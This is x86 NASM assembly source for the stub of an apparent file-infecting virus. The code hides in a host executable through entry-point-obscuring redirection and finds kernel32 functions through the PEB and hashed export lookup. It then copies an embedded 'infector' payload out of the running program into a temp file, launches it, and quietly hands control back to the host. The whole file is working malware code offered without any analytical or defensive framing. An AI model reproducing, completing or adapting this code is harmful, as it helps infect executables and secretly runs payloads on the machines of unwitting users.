; stub for dropping executables, supports control redirection from all the EPO techniques
; shebaw
;

section .text

%define PLACE_HOLDER	0cccccccch

%define WORD_SIZE	2
%define WCHAR_SIZE	2
%define PTR_SIZE	4
%define UINT_MAX	0ffffffffh
%define MAX_PATH	260
%define PATH_SIZE	(MAX_PATH * WCHAR_SIZE)

%define CREATE_ALWAYS		2	
%define OPEN_EXISTING		3
%define FILE_SHARE_READ		01h
%define FILE_ATTRIBUTE_NORMAL	080h
%define GENERIC_READ		080000000h
%define GENERIC_WRITE		040000000h
%define	FILE_BEGIN		0

%define PAGE_EXECUTE_READWRITE	040h

%define INVALID_HANDLE_VALUE	-1

struc	loaded_apis

	.CreateFileW:		resd	1
	.ReadFile		resd	1
	.WriteFile:		resd	1
	.SetFilePointer:	resd	1
	.CreateProcessW:	resd	1
	.CloseHandle		resd	1
	.GetTempPathW:		resd	1
	.GetTempFileNameW:	resd	1
	.GetModuleFileNameW:	resd	1
	.VirtualProtect		resd	1

endstruc

struc	PROCESS_INFORMATION

	.hProcess:	resd	1
	.hThread:	resd	1
	.dwProcessId:	resd	1
	.dwThreadId	resd	1

endstruc

struc STARTUPINFO

	.cb			resd	1
	.lpReserved		resd	1
	.lpDesktop		resd	1
	.lpTitle		resd	1
	.dwX			resd	1
	.dwY			resd	1
	.dwXSize		resd	1
	.dwYSize		resd	1
	.dwXCountChars		resd	1
	.dwyCountChars		resd	1
	.dwFileAttribute	resd	1
	.dwFlags		resd	1
	.wShowWindow		resw	1
	.cbReserved2		resw	1
	.lpReserved2		resd	1
	.hStdInput		resd	1
	.hStdOutput		resd	1
	.hStdError		resd	1

endstruc


; bastardized versions of the DOS/PE headers

%define IMAGE_DOS_SIGNATURE	5A4Dh
%define IMAGE_NT_SIGNATURE	00004550h

struc IMAGE_DOS_HEADER

	.useless	resb	3ch
	.e_lfanew	resd	1

endstruc

struc	IMAGE_NT_HEADERS

	.Signature	resd	1
	.useless	resb	74h

endstruc

struc IMAGE_DATA_DIRECTORY
	
	.VirtualAddress		resd	1
	.Size			resd	1

endstruc

struc IMAGE_EXPORT_DIRECTORY

	.Characteristics	resd	1
	.TimeDateStamp		resd	1
	.MajorVersion		resw	1
	.MinorVersion		resw	1
	.Name			resd	1
	.Base			resd	1
	.NumberOfFunctions	resd	1
	.NumberOfNames		resd	1
	.AddressOfFunctions	resd	1
	.AddressOfNames		resd	1
	.AddressOfNameOrdinals	resd	1

endstruc

struc IMAGE_THUNK_DATA

	.Function		resd	1

endstruc

; TODO: protect the flag checking in ILockedInc/ILockedDec guard

global _stub_entry
_stub_entry:

%define OEP_STACK_OFFSET	8			; ebp + 4
%define STACK_SIZE		(4+loaded_apis_size+4)

%define	oep		[ebp-4]
%define func_ptrs	[ebp-(4+loaded_apis_size)]
%define old_prot	[ebp-STACK_SIZE]

	push	ebp
	mov	ebp, esp
	sub	esp, STACK_SIZE
	pushad						; 8*4 bytes
	pushf						; 4 bytes
	
	call	_get_base_address
_get_base_address:
	pop	ecx

	; test if it's already executed
	lea	ebx, [ecx+.already_executed-_get_base_address]
	mov	al, [ebx]
	test	al, al
	jnz	.jmp_to_oep

		lea	edx, func_ptrs
		push	edx				; func_ptrs
		push	ecx				; saved_ebp
		lea	eax, [ecx + PLACE_HOLDER]
		call	eax				; load_kernel32_funcs

		push	edx				; imported functions
		push	ecx				; saved_ebp
		lea	eax, [ecx + PLACE_HOLDER]	; drop_and_execute
		call	eax

		mov	eax, PLACE_HOLDER		; is cr_type epo_most_ref_subr_t
		test	eax, eax
		jnz	.rbld_subr

		; mark success
		push	edx				; imported functions
		push	ebx				; flag
		lea	eax, [ecx + PLACE_HOLDER]	; mark_success
		call	eax
		jmp	.jmp_to_oep

.rbld_subr:
		mov	ebx, ecx			; ebx = tombstone

		lea	edi, [ebx + PLACE_HOLDER]	; address to the subroutine
		mov	oep, edi			; pass control to the subroutine after we modify it

		; change the memory protection of the subroutine
		lea	eax, old_prot
		push	eax				; pointer to old protection
		push	PAGE_EXECUTE_READWRITE
		push	5
		push	edi
		call	[edx + loaded_apis.VirtualProtect]

		lea	esi, [ebx + .5byte_prolog-_get_base_address]
		mov	eax, PLACE_HOLDER		; is 3 byte prolog?
		test	eax, eax
		jz	.cpy_prolog

		; 3 byte prolog
		add	esi, 2				; jump mov edx, edx
.cpy_prolog:
		mov	ecx, 5
		cld
		rep	movsb				; restore the subroutine's epiloge

		; restore the memory protection of the subroutine
		lea	eax, old_prot
		push	eax				; pointer to old protection
		push	dword old_prot			; new protection
		push	5
		push	dword oep			; dest
		lea	edx, func_ptrs
		call	[edx + loaded_apis.VirtualProtect]
		jmp	.func_end

.jmp_to_oep:
	push	ecx					; saved ebp
	lea	eax, [ecx + PLACE_HOLDER]		; get_oep
	call	eax
	mov	oep, eax

.func_end:
	popf
	popad
	mov	esp, ebp
	pop	ebp

	push	dword [esp - OEP_STACK_OFFSET]		; push the oep
	ret

.already_executed:
	db	0h

.5byte_prolog:
	mov	edx, edx
.3byte_prolog:
	push	ebp
	mov	ebp, esp
.prolog_tail:
	dw	0h					; placeholder for the 2 bytes that get overwritten

global _stub_entry_size
_stub_entry_size:
	dd $-_stub_entry

global _base_offset
_base_offset:
	dd _get_base_address-_stub_entry



; returns the offset of the OEP
; not inserted if cr_type is epo_most_ref_subr_t
global _get_oep
_get_oep:
%define saved_ebp	[ebp + 8]
	push	ebp
	mov	ebp, esp
	push	ebx

	mov	eax, PLACE_HOLDER			; offset to oep / ptr to oep
	add	eax, saved_ebp
	mov	ebx, PLACE_HOLDER			; is abs_call
	test	ebx, ebx
	jz	.func_end
	mov	eax, [eax]				; dereference the value

.func_end:
	pop	ebx
	mov	esp, ebp
	pop	ebp
	retn	4

global _get_oep_size
_get_oep_size:
	dd $-_get_oep



global	_drop_and_execute
_drop_and_execute:

%define STACK_SIZE	(PATH_SIZE+4)

%define func_ptrs	[ebp+12]
%define saved_ebp	[ebp+8]

%define dropped_path	[ebp-PATH_SIZE]
%define result		[ebp-STACK_SIZE]

	push	ebp
	mov	ebp, esp
	sub	esp, STACK_SIZE
	pushad

	; initialise result to zero
	xor	eax, eax
	mov	result, eax

	mov	eax, saved_ebp
	lea	eax, [eax + PLACE_HOLDER]	; get_infctr_details, return size in edx, ptr in eax
	call	eax	


	mov	ebx, func_ptrs

	push	ebx				; func_ptrs
	lea	esi, dropped_path
	push	esi
	push	edx				; infector size
	push	eax				; ptr to embeded infector
	mov	eax, saved_ebp
	lea	eax, [eax + PLACE_HOLDER]	; drop_file
	call	eax

	; if not dropped, then return execution to oep
	test	eax, eax
	jz	.func_end

	push	ebx				; func_ptrs
	push	esi				; file_path
	mov	eax, saved_ebp
	lea	eax, [eax + PLACE_HOLDER]	; execute_file
	call	eax
	
	mov	result, eax
.func_end:
	popad
	mov	eax, result
	mov	esp, ebp
	pop	ebp
	retn	8

global	_drop_and_execute_size
_drop_and_execute_size:
	dd $-_drop_and_execute



global _mark_success
_mark_success:

%define func_ptrs	[ebp+12]
%define marker		[ebp+8]

%define old_prot	[ebp-4]

	push	ebp
	mov	ebp, esp
	sub	esp, 4
	pushad
	
	mov	ebx, func_ptrs

	lea	eax, old_prot
	push	eax
	push	PAGE_EXECUTE_READWRITE
	push	1
	push	dword marker
	call	[ebx+loaded_apis.VirtualProtect]
	test	eax, eax
	jz	.func_end

	mov	eax, marker
	mov	byte [eax], 1

	lea	eax, old_prot
	push	eax
	push	dword old_prot
	push	1
	push	dword marker
	call	[ebx+loaded_apis.VirtualProtect]

.func_end:
	popad
	mov	esp, ebp
	pop	ebp
	retn	8

global _mark_success_size
_mark_success_size:
	dd	$-_mark_success



global _get_infctr_details
_get_infctr_details:

	mov	eax, PLACE_HOLDER	; ptr to dropee
	mov	edx, PLACE_HOLDER	; size of dropee
	ret

global _get_infctr_details_size
_get_infctr_details_size:
	dd	$-_get_infctr_details



;loads apis listed in func_names and populates the passed 
;api_ptrs structure with their respective addresses
global	_load_kernel32_funcs

_load_kernel32_funcs:
%define api_ptrs	[ebp+12]
%define saved_ebp	[ebp+8]

%define STACK_SIZE	16

%define base		[ebp-4]
%define kernel32_base	[ebp-8]
%define gpa		[ebp-12]
%define result		[ebp-16]

	push	ebp
	mov	ebp, esp
	sub	esp, STACK_SIZE
	pushad

	xor	eax, eax
	mov	result, eax

	call	.get_eip
.get_eip:
	pop	dword base

	; get kernel32's base address
	mov	eax, saved_ebp
	push	eax				; saved_ebp
	lea	ebx, [eax + PLACE_HOLDER]	; get_kernel32_addr
	call	ebx	
	pop	ebx				; cdecl because there are two versions of the function
	test	eax, eax
	jz	.func_end
	mov	kernel32_base, eax

	; get GetProcAddress
	push	dword saved_ebp			; saved ebp
	mov	eax, base
	lea	ebx, [eax+.gpa_hash-.get_eip]
	push	dword [ebx]			; gpa_hash
	push	dword kernel32_base		; kernel32_addr
	mov	eax, saved_ebp
	lea	ebx, [eax + PLACE_HOLDER]	; gpa_by_hash
	call	ebx	
	test	eax, eax
	jz	.func_end
	mov	gpa, eax

	; load the functions
	mov	esi, base
	add	esi, .imp_funcs - .get_eip	; esi now points to .imp_funcs
	mov	edi, api_ptrs

	mov	ebx, saved_ebp
	add	ebx, PLACE_HOLDER		; mstrlen
.load_loop:
		mov	al, [esi]
		test	al, al
		jz	.loop_end		; hit the null mark

		push	esi
		call	ebx			; mstrlen
		push	eax			; save the result

		push	esi
		push	dword kernel32_base
		call	gpa
		test	eax, eax
		jz	.func_end
		
		mov	[edi], eax
		add	edi, PTR_SIZE
		pop	eax
		add	esi, eax
		inc	esi			; forward the null value
		jmp	.load_loop
.loop_end:
	xor	eax, eax
	inc	eax
	mov	result, eax

.func_end:
	popad
	mov	eax, result
	mov	esp, ebp
	pop	ebp
	ret	8
.gpa_hash:
	dd 0935a10d8h				; GetProcAddress
.imp_funcs:
	db "CreateFileW", 0
	db "ReadFile", 0
	db "WriteFile", 0
	db "SetFilePointer", 0
	db "CreateProcessW", 0
	db "CloseHandle", 0
	db "GetTempPathW", 0
	db "GetTempFileNameW", 0
	db "GetModuleFileNameW", 0
	db "VirtualProtect", 0
	db 0

global	_load_kernel32_funcs_size
_load_kernel32_funcs_size:
	dd	$-_load_kernel32_funcs



global _get_kernel32_addr1
_get_kernel32_addr1:

%define saved_ebp	[ebp+8]

%define result		[ebp-4]

	push	ebp
	mov	ebp, esp
	sub	esp, 4
	pushad				; save the registers since we are going to call an API
	
	call	.get_eip
.get_eip:
	pop	ecx

	mov	eax, PLACE_HOLDER	; is unicode?
	test	eax, eax
	jz	.not_unicode
	add	ecx, .gmhw-.get_eip
	jmp	.push_arg

.not_unicode:
	add	ecx, .gmha-.get_eip
.push_arg:
	push	ecx			; lpModule
	
	
	mov	ebx, saved_ebp
	add	ebx, PLACE_HOLDER	; offset to GMHA/W's thunk data
	mov	eax, [ebx+IMAGE_THUNK_DATA.Function]

	call	eax			; GetModuleHandleA/W
	mov	result, eax

	popad
	mov	eax, result
	mov	esp, ebp
	pop	ebp
	ret

.gmha:
	db "kernel32.dll", 0
.gmhw:
	dw __utf16__('kernel32.dll'), 0
	
global _get_kernel32_addr1_size
_get_kernel32_addr1_size:
	dd	$-_get_kernel32_addr1



; gets kernel32's base address using get_module_base
global	_get_kernel32_addr2
_get_kernel32_addr2:

%define saved_ebp	[ebp+8]
	push	ebp
	mov	ebp, esp
	push	ebx

	mov	ebx, saved_ebp
	push	dword [ebx + PLACE_HOLDER]	; offset to a kernel32 function's import entry
	lea	eax, [ebx + PLACE_HOLDER]	; get_module_base
	call	eax

	pop	ebx
	mov	esp, ebp
	pop	ebp
	ret

global	_get_kernel32_addr2_size
_get_kernel32_addr2_size:
	dd	$-_get_kernel32_addr2



; gets kernel32's base address from PEB
global	_get_kernel32_addr3
_get_kernel32_addr3:

	push	ecx

	; retrieving kernel32.dll's base address from PEB
	; http://my.opera.com/wolfcod/blog/
	mov	eax, [fs:030h]		; PEB address
	mov	eax, [eax+0ch]		; PEB->PEB_LDR_DATA address
	mov	eax, [eax+0ch]		; InLoadOrderModuleList

	mov	ecx, 2

.repeat:
		mov	eax, [eax]			; Traverse the linked list
	loop	.repeat

	mov	eax, [eax+018h]		; Image Base of KERNEL32

	pop	ecx
	ret
	
global	_get_kernel32_addr3_size
_get_kernel32_addr3_size:
	dd	$-_get_kernel32_addr3

	
	
global _execute_file
_execute_file:

%define STACK_SIZE	(STARTUPINFO_size + PROCESS_INFORMATION_size)

%define func_ptrs	[ebp+12]
%define file_path	[ebp+8]

%define startup_info	[ebp-STARTUPINFO_size]
%define proc_info	[ebp-STACK_SIZE]

	push	ebp
	mov	ebp, esp
	sub	esp, STACK_SIZE
	pushad

	cld

	xor	al, al
	lea	edi, proc_info
	push	edi						; proc_info
	mov	ecx, PROCESS_INFORMATION_size
	rep	stosb

	lea	edi, startup_info
	push	edi						; startup_info
	mov	ecx, STARTUPINFO_size
	rep	stosb
	lea	edi, startup_info
	mov	dword [edi+STARTUPINFO.cb], STARTUPINFO_size

	xor	edi, edi
	mov	ecx, 7
.push_args:
		push	edi
		loop	.push_args

	push	dword file_path
	mov	ebx, func_ptrs
	call	[ebx+loaded_apis.CreateProcessW]
	test	eax, eax
	jz	.func_end

		mov	ebx, [ebx+loaded_apis.CloseHandle]
		lea	edi, proc_info
		push	dword [edi+PROCESS_INFORMATION.hThread]
		call	ebx
		push	dword [edi+PROCESS_INFORMATION.hProcess]
		call	ebx

		xor	eax, eax
		inc	eax

.func_end:
	popad
	mov	esp, ebp
	pop	ebp
	retn	8

global	_execute_file_size
_execute_file_size:
	dd	$-_execute_file
	
	

; returns 0 on failure, 1 on success
global	_drop_file
_drop_file:

%define WRITE_BUF_SIZE	100

%define func_ptrs	[ebp+20]
%define file_path	[ebp+16]
%define buffer_size	[ebp+12]
%define buffer_offset	[ebp+8]

%define path_buf	[ebp-PATH_SIZE]
%define self_path	[ebp-(2*PATH_SIZE)]
%define bytes_read	[ebp-(2*PATH_SIZE+4)]
%define bytes_written	[ebp-(2*PATH_SIZE+8)]
%define sfile_handle	[ebp-(2*PATH_SIZE+12)]
%define dfile_handle	[ebp-(2*PATH_SIZE+16)]
%define result		[ebp-(2*PATH_SIZE+20)]
%define write_buf	[ebp-(2*PATH_SIZE+WRITE_BUF_SIZE+20)]

%define STACK_SIZE	(2*PATH_SIZE+WRITE_BUF_SIZE+20)

	push	ebp
	mov	ebp, esp
	sub	esp, STACK_SIZE
	pushad

	; initialize result to zero
	xor	eax, eax
	mov	result, eax

	; get the temp folder path
	lea	eax, path_buf
	push	eax
	push	MAX_PATH
	mov	ebx, func_ptrs
	call	[ebx+loaded_apis.GetTempPathW]
	test	eax, eax
	jz	.func_end

	; get temporary file name
	push	dword file_path
	push	0				; unique
	call	.push_prefix
	dw __utf16__('~mz'), 0
.push_prefix:
	lea	eax, path_buf
	push	eax
	call	[ebx+loaded_apis.GetTempFileNameW]
	test	eax, eax
	jz	.func_end

	; open the destination file
	xor	edx, edx
	push	edx
	push	FILE_ATTRIBUTE_NORMAL
	push	CREATE_ALWAYS
	push	edx
	push	edx
	push	GENERIC_READ | GENERIC_WRITE
	push	dword file_path
	call	[ebx+loaded_apis.CreateFileW]
	cmp	eax, INVALID_HANDLE_VALUE
	je	.func_end
	mov	dfile_handle, eax

	; get the path name of the running executable
	push	MAX_PATH
	lea	esi, self_path
	push	esi
	push	0				; NULL
	call	[ebx+loaded_apis.GetModuleFileNameW]
	test	eax, eax
	jz	.cleanup

	; open self for reading
	xor	edx, edx
	push	edx
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	edx
	push	FILE_SHARE_READ
	push	GENERIC_READ
	push	esi
	call	[ebx+loaded_apis.CreateFileW]
	cmp	eax, INVALID_HANDLE_VALUE
	je	.cleanup
	mov	sfile_handle, eax

	; seek to the droppee source
	push	FILE_BEGIN
	push	0
	push	dword buffer_offset
	push	eax					; source file handle
	call	[ebx+loaded_apis.SetFilePointer]

.read_write_loop:
		; read contents to buffer
		push	0
		lea	edx, bytes_read
		push	edx
		push	WRITE_BUF_SIZE
		lea	edx, write_buf
		push	edx
		push	dword sfile_handle
		call	[ebx+loaded_apis.ReadFile]
		test	eax, eax
		jz	.sfile_cleanup


		push	0
		lea	edx, bytes_written
		push	edx
		push	dword bytes_read
		lea	edx, write_buf
		push	edx
		push	dword dfile_handle
		call	[ebx+loaded_apis.WriteFile]

		mov	eax, bytes_read
		cmp	eax, WRITE_BUF_SIZE
		jne	.loop_end

		jmp	.read_write_loop
.loop_end:
	; successfully completed reading
	mov	dword result, 1
.sfile_cleanup:
	push	dword sfile_handle
	call	[ebx+loaded_apis.CloseHandle]

.cleanup:
	push	dword dfile_handle
	call	[ebx+loaded_apis.CloseHandle]

.func_end:
	popad
	mov	eax, result
	mov	esp, ebp
	pop	ebp
	retn	16

global	_drop_file_size
_drop_file_size:
	dd	$-_drop_file



global	_get_module_base

_get_module_base:

%define PAGE_SIZE	0x1000

%define body_address	[ebp+8]

	push	ebp
	mov	ebp, esp
	push	edi
	push	esi

	mov	edi, body_address
	xor	di, di					; images are loaded on 64K boundary

.gmb_loop:
		cmp	word [edi], IMAGE_DOS_SIGNATURE					; did we find dos header?
		jne	.not_here
		mov	esi, edi
		add	esi, [edi+IMAGE_DOS_HEADER.e_lfanew]
		cmp	dword [edi+IMAGE_NT_HEADERS.Signature], IMAGE_NT_SIGNATURE	; is the dos header real?
		je	.found
.not_here:
		sub	edi, PAGE_SIZE
		jmp	.gmb_loop
.found:
	mov	eax, edi
	pop	esi
	pop	edi
	mov	esp, ebp
	pop	ebp
	retn	4

global	_get_module_base_size
_get_module_base_size:
	dd	$-_get_module_base



; uses hashes instead of strings
global	_gpa_by_hash
_gpa_by_hash:

%define saved_ebp	[ebp+16]
%define proc_hash	[ebp+12]
%define module_base	[ebp+8]

%define EXP_DIR_OFFSET	0x78

	push	ebp
	mov	ebp, esp
	push	ebx
	push	ecx
	push	esi
	push	edi


	mov	ebx, saved_ebp

	mov	edi, module_base
	add	edi, [edi+IMAGE_DOS_HEADER.e_lfanew]
	lea	edi, [edi+EXP_DIR_OFFSET]				; export_dir_entry
	mov	edi, [edi+IMAGE_DATA_DIRECTORY.VirtualAddress]		; export_dir_entry.VirtualAddress
	test	edi, edi
	jz	.not_found

	add	edi, module_base					; export_dir (VA)
	xor	ecx, ecx
	mov	esi, [edi+IMAGE_EXPORT_DIRECTORY.AddressOfNames]
	add	esi, module_base					; esi points to array of function name pointers

.gpa_loop:
		cmp	ecx, [edi+IMAGE_EXPORT_DIRECTORY.NumberOfNames]
		jnb	.not_found

		mov	eax, [esi+ecx*PTR_SIZE]
		add	eax, module_base				; function name
		push	ebx						; saved ebp
		push	eax						; proc_name
		lea	eax, [ebx + PLACE_HOLDER]			; hash_func
		call	eax						; hash_func
		cmp	eax, proc_hash
		je	.found

		inc	ecx
		jmp	.gpa_loop
.found:
			mov	esi, [edi+IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals]
			add	esi, module_base
			movzx	eax, word [esi+ecx*WORD_SIZE]		; ordinal
			mov	esi, [edi+IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]
			add	esi, module_base
			mov	eax, [esi+eax*PTR_SIZE]
			add	eax, module_base
			jmp	.func_end
.not_found:
	xor	eax, eax
.func_end:
	pop	edi
	pop	esi
	pop	ecx
	pop	ebx
	mov	esp, ebp
	pop	ebp
	retn	12

global	_gpa_by_hash_size
_gpa_by_hash_size:
	dd	$-_gpa_by_hash



global _mstrlen
_mstrlen:
	
%define str	[ebp+8]
	push	ebp
	mov	ebp, esp
	push	edi
	push	ecx
	pushfd

	mov	edi, str

	xor	al, al
	xor	ecx, ecx
	not	ecx
	cld
	repne	scasb
	not	ecx
	dec	ecx
	mov	eax, ecx

	popfd
	pop	ecx
	pop	edi
	mov	esp, ebp
	pop	ebp
	retn	4


global	_mstrlen_size
_mstrlen_size:
	dd	$-_mstrlen



global	_mstrcmp

_mstrcmp:

%define str2	[ebp+12]
%define str1	[ebp+8]

	push	ebp
	mov	ebp, esp
	push	ecx
	push	edx
	
	mov	ecx, str1
	mov	edx, str2

.strcmp_loop:
		mov	al, [ecx]
		cmp	al, [edx]
		jne	.not_equal
		test	al, al
		jz	.equal
		inc	ecx
		inc	edx
		jmp	.strcmp_loop

.equal:
	xor	eax, eax
	jmp	.func_end
.not_equal:
	mov	eax, 1
.func_end:
	pop	edx
	pop	ecx
	mov	esp, ebp
	pop	ebp
	retn	8

global	_mstrcmp_size
_mstrcmp_size:
	dd $-_mstrcmp


global _hash_func
_hash_func:

%define	saved_ebp	[ebp+12]
%define	string		[ebp+8]

%define HASH_MULTIPLIER	9ccf9319h

	push	ebp
	mov	ebp, esp
	push	ebx
	push	ecx
	push	esi
	push	edx

	mov	ebx, saved_ebp
	add	ebx, PLACE_HOLDER	; mstrlen
	push	dword string
	call	ebx

	mov	ecx, eax		; ecx = strlen
	xor	eax, eax		; hashcode = 0
	mov	esi, string
.loop:
	movzx	edx, byte [esi]
	add	eax, edx
	add	eax, HASH_MULTIPLIER
	inc	esi
	loop	.loop

	xor	edx, edx
	mov	ecx, UINT_MAX
	div	ecx
	mov	eax, edx

	pop	edx
	pop	esi
	pop	ecx
	pop	ebx
	mov	esp, ebp
	pop	ebp
	retn	8

global _hash_func_size
_hash_func_size:
	dd	$-_hash_func